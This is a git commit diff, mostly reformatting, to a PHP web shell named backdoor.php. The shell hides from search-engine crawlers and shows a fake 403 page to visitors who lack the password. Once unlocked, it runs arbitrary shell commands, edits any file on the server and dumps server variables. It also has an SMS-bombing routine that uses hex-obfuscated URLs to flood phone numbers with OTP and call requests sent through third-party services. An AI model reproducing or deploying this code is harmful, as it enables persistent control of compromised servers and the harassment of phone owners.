7135821ade91a0e782b3cae771518b6884081456
Cvar1984 <32727560+Cvar1984@users.noreply.github.com>
2018-06-10 17:45:37 +0700

    Fix Open dir for linux

--- backdoor.php
+++ backdoor.php
@@ -1,26 +1,26 @@
 <?php
 /*
  * backdoor.php
- * 
+ *
  * Copyright 2018 Cvar1984 <Cvar1984@P22DX>
- * 
+ *
  * This program is free software; you can redistribute it and/or modify
  * it under the terms of the GNU General Public License as published by
  * the Free Software Foundation; either version 2 of the License, or
  * (at your option) any later version.
- * 
+ *
  * This program is distributed in the hope that it will be useful,
  * but WITHOUT ANY WARRANTY; without even the implied warranty of
  * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
  * GNU General Public License for more details.
- * 
+ *
  * You should have received a copy of the GNU General Public License
  * along with this program; if not, write to the Free Software
  * Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
  * MA 02110-1301, USA.
- * 
- * 
- */
+ *
+ *
+*/
 session_start();
 //set_time_limit(0);
 //ini_set('error_log',0);
@@ -28,36 +28,37 @@ session_start();
 //ini_set('display_errors',0);
 //ini_set('max_execution_time',0);
 $auth_pass = "40c880e51dca8d68fddadff873dca125"; // 7c
-if(!empty($_SERVER['HTTP_USER_AGENT'])) {
-$userAgents = array(
-	"Googlebot",
-	"DuckDuckBot",
-	"Baiduspider",
-	"Exabot",
-	"SimplePie",
-	"Curl",
-	"OkHttp",
-	"SiteLockSpider",
-	"BLEXBot",
-	"ScoutJet",
-	"AdsBot Google Mobile",
-	"Googlebot Mobile",
-	"MJ12bot",
-	"Slurp",
-	"MSNBot",
-	"PycURL",
-	"facebookexternalhit",
-	"facebot",
-	"ia_archiver",
-	"crawler",
-	"YandexBot",
-	"Rambler",
-	"Yahoo! Slurp",
-	"YahooSeeker",
-	"bingbot");
-if(preg_match('/'.implode('|',$userAgents).'/i',$_SERVER['HTTP_USER_AGENT'])) {
-	header('HTTP/1.0 404 Not Found');
-	exit;
+if (!empty($_SERVER['HTTP_USER_AGENT'])) {
+	$userAgents = array(
+		"Googlebot",
+		"DuckDuckBot",
+		"Baiduspider",
+		"Exabot",
+		"SimplePie",
+		"Curl",
+		"OkHttp",
+		"SiteLockSpider",
+		"BLEXBot",
+		"ScoutJet",
+		"AdsBot Google Mobile",
+		"Googlebot Mobile",
+		"MJ12bot",
+		"Slurp",
+		"MSNBot",
+		"PycURL",
+		"facebookexternalhit",
+		"facebot",
+		"ia_archiver",
+		"crawler",
+		"YandexBot",
+		"Rambler",
+		"Yahoo! Slurp",
+		"YahooSeeker",
+		"bingbot"
+	);
+	if (preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
+		header('HTTP/1.0 404 Not Found');
+		exit;
 	}
 }
 function login_shell() {
@@ -65,17 +66,18 @@ function login_shell() {
 <title>403 Forbidden</title>
 <head>
 <h1>Forbidden</h1>
-<p>You don't have permission to access <?php echo $_SERVER['REQUEST_URI'];?>
+<p>You don't have permission to access <?php echo $_SERVER['REQUEST_URI']; ?>
  on this server.</p>
 <p>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.</p>
 </head>
 <?php
-exit;
+	exit;
 }
-if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) {
-	if(empty($auth_pass) OR (isset($_GET['pass']) AND md5(sha1($_GET['pass'])) == $auth_pass)) {
-		$_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
-	} else {
+if (!isset($_SESSION[md5($_SERVER['HTTP_HOST']) ])) {
+	if (empty($auth_pass) or (isset($_GET['pass']) and md5(sha1($_GET['pass'])) == $auth_pass)) {
+		$_SESSION[md5($_SERVER['HTTP_HOST']) ] = true;
+	}
+	else {
 		login_shell();
 	}
 }
@@ -136,10 +138,9 @@ body {
 	</head>
 	<body>
 <?php
-
 // FUNCTION
 function home() {
-	?>
+?>
 	<script>window.location='?';</script>
 	<?php
 }
@@ -154,34 +155,35 @@ function spamsms() {
 </form>
 </center>
 <?php
-function post_data($url,$data) {
-	$ch=curl_init($url);
-	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-	curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
-	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
-	return curl_exec($ch);
-	curl_close($ch);
-}
-if(isset($_POST['action'])) {
-$no=explode("\n",$_POST['no']);
-$no=str_replace(' ','',$no);
-$no=str_replace("\n\n","\n",$no);
-foreach($no as $on):
-echo "<hr>Calling     -> ".$on."<hr><br>";
-	post_data("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x77\x77\x2e\x74\x6f\x6b\x6f\x63\x61\x73\x68\x2e\x63\x6f\x6d\x2f\x6f\x61\x75\x74\x68\x2f\x6f\x74\x70","msisdn=".$on."&accept=call");
-endforeach;
-for($x=0;$x<100;$x++) {
-foreach($no as $on):
-echo "<hr>Send OTP To -> ".$on."<hr><br>";
-	post_data("\x68\x74\x74\x70\x3a\x2f\x2f\x73\x63\x2e\x6a\x64\x2e\x69\x64\x2f\x70\x68\x6f\x6e\x65\x2f\x73\x65\x6e\x64\x50\x68\x6f\x6e\x65\x53\x6d\x73","phone=".$on."&smsType=1");
-	post_data("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x77\x77\x2e\x70\x68\x64\x2e\x63\x6f\x2e\x69\x64\x2f\x65\x6e\x2f\x75\x73\x65\x72\x73\x2f\x73\x65\x6e\x64\x4f\x54\x50","phone_number=".$on);
-endforeach;
-}
-} else {
+	function post_data($url, $data) {
+		$ch = curl_init($url);
+		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+		curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
+		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+		return curl_exec($ch);
+		curl_close($ch);
+	}
+	if (isset($_POST['action'])) {
+		$no = explode("\n", $_POST['no']);
+		$no = str_replace(' ', '', $no);
+		$no = str_replace("\n\n", "\n", $no);
+		foreach ($no as $on):
+			echo "<hr>Calling     -> " . $on . "<hr><br>";
+			post_data("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x77\x77\x2e\x74\x6f\x6b\x6f\x63\x61\x73\x68\x2e\x63\x6f\x6d\x2f\x6f\x61\x75\x74\x68\x2f\x6f\x74\x70", "msisdn=" . $on . "&accept=call");
+		endforeach;
+		for ($x = 0;$x < 100;$x++) {
+			foreach ($no as $on):
+				echo "<hr>Send OTP To -> " . $on . "<hr><br>";
+				post_data("\x68\x74\x74\x70\x3a\x2f\x2f\x73\x63\x2e\x6a\x64\x2e\x69\x64\x2f\x70\x68\x6f\x6e\x65\x2f\x73\x65\x6e\x64\x50\x68\x6f\x6e\x65\x53\x6d\x73", "phone=" . $on . "&smsType=1");
+				post_data("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x77\x77\x2e\x70\x68\x64\x2e\x63\x6f\x2e\x69\x64\x2f\x65\x6e\x2f\x75\x73\x65\x72\x73\x2f\x73\x65\x6e\x64\x4f\x54\x50", "phone_number=" . $on);
+			endforeach;
+		}
+	}
+	else {
+		die();
+	}
 	die();
-}
-die();
 }
 function jumping() {
 	alert("Kalem euy");
@@ -193,64 +195,69 @@ function mass_deface() {
 	alert("Kalem euy");
 }
 function info() {
-	?>
+?>
 	<center>
-	<textarea class="form-control" id="textarea" readonly/><?php print_r($_SERVER);?></textarea>
+	<textarea class="form-control" id="textarea" readonly/><?php print_r($_SERVER); ?></textarea>
 	</center>
 	<?php
 	die();
 }
 function logout() {
-	unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
+	unset($_SESSION[md5($_SERVER['HTTP_HOST']) ]);
 	home();
 }
 function alert($message) {
-	echo "<script>alert('".$message."')</script>";
+	echo "<script>alert('" . $message . "')</script>";
 }
 function edit($filename) {
-	if(isset($_POST['text'])) {
-	// save the text contents
-	file_put_contents($filename, $_POST['text']);
-}
-// read the textfile
-$text=file_get_contents($filename);
+	if (isset($_POST['text'])) {
+		// save the text contents
+		file_put_contents($filename, $_POST['text']);
+	}
+	// read the textfile
+	$text = file_get_contents($filename);
 ?>
 <!-- HTML form -->
 <form action="" method="post">
-	<center>
-		<h2>Files Editor : <?php echo $filename;?></h2>
+<center>
+<h5>Files Editor : <?php echo $filename; ?></h5>
 <textarea name="text" class="form-control" id="textarea"><?php echo htmlspecialchars($text) ?></textarea><br>
 <input type="submit" class="btn btn-danger" />
 </center>
 </form>
 <?php
-die();
+	die();
 }
 function cmd($cmd) {
-	if(function_exists('system')) {
+	if (function_exists('system')) {
 		ob_start();
 		@system($cmd);
-		$buff=ob_get_contents();
+		$buff = ob_get_contents();
 		ob_end_clean();
 		return $buff;
-	} elseif(function_exists('exec')) {
-		@exec($cmd,$results);
+	}
+	elseif (function_exists('exec')) {
+		@exec($cmd, $results);
 		$buff = "";
-		foreach($results as $result) {
+		foreach ($results as $result) {
 			$buff .= $result;
-		} return $buff;
-	} elseif(function_exists('passthru')) {
+		}
+		return $buff;
+	}
+	elseif (function_exists('passthru')) {
 		ob_start();
 		@passthru($cmd);
-		$buff=ob_get_contents();
+		$buff = ob_get_contents();
 		ob_end_clean();
 		return $buff;
-	} elseif(function_exists('shell_exec')) {
+	}
+	elseif (function_exists('shell_exec')) {
 		$buff = @shell_exec($cmd);
 		return $buff;
-	} 
+	}
 }
 // ENDFUNCTION
+
 ?>
 <center>
 	<div id='menu'>
@@ -265,37 +272,53 @@ function cmd($cmd) {
 	</div>
 </center>
 <?php
-if($_GET['do'] == 'home') {
+if ($_GET['do'] == 'home') {
 	home();
-} elseif($_GET['do'] == 'sms') {
+}
+elseif ($_GET['do'] == 'sms') {
 	spamsms();
-} elseif($_GET['do'] == 'jumping') {
+}
+elseif ($_GET['do'] == 'jumping') {
 	jumping();
-} elseif($_GET['do'] == 'config') {
+}
+elseif ($_GET['do'] == 'config') {
 	config();
-} elseif($_GET['do'] == 'mass_deface') {
+}
+elseif ($_GET['do'] == 'mass_deface') {
 	mass_deface();
-} elseif($_GET['do'] =='info') {
+}
+elseif ($_GET['do'] == 'info') {
 	info();
-} elseif($_GET['do'] == 'logout') {
+}
+elseif ($_GET['do'] == 'logout') {
 	logout();
-} elseif($_GET['do'] == 'edit' AND isset($_GET['files'])) {
+}
+elseif ($_GET['do'] == 'edit' and isset($_GET['files'])) {
 	edit($_GET['files']);
-} elseif($_GET['do'] == 'open' AND isset($_GET['dir'])) {
+}
+elseif ($_GET['do'] == 'open' and isset($_GET['dir'])) {
 	$dir = $_GET['dir'];
 	chdir($dir);
 }
 $dir = scandir(getcwd());
-foreach($dir as $dir):
+foreach ($dir as $dir):
 ?>
 <table width='70%' class='table_home' cellpadding='3' cellspacing='3' align='center'>
 	<tr>
-		<?php if(is_dir($dir)) {
-		echo "<td><a href='?do=open&dir=".getcwd().substr('\\',0,1).$dir."'>$dir</a></td>";
-	} else {
-		echo "<td><a href='?do=edit&files=".getcwd().substr('\\',0,1).$dir."'>$dir</a></td>";
+		<?php
+	if (strtolower(substr(PHP_OS, 0, 3)) == "win") {
+		$sep = substr('\\', 0, 1);
 	}
-	?>
+	else {
+		$sep = '/';
+	}
+	if (is_dir($dir)) {
+		echo "<td><a href='?do=open&dir=" . getcwd() . $sep . $dir . "'>$dir</a></td>";
+	}
+	else {
+		echo "<td><a href='?do=edit&files=" . getcwd() . $sep . $dir . "'>$dir</a></td>";
+	}
+?>
 	</tr>
 </table>
 <?php
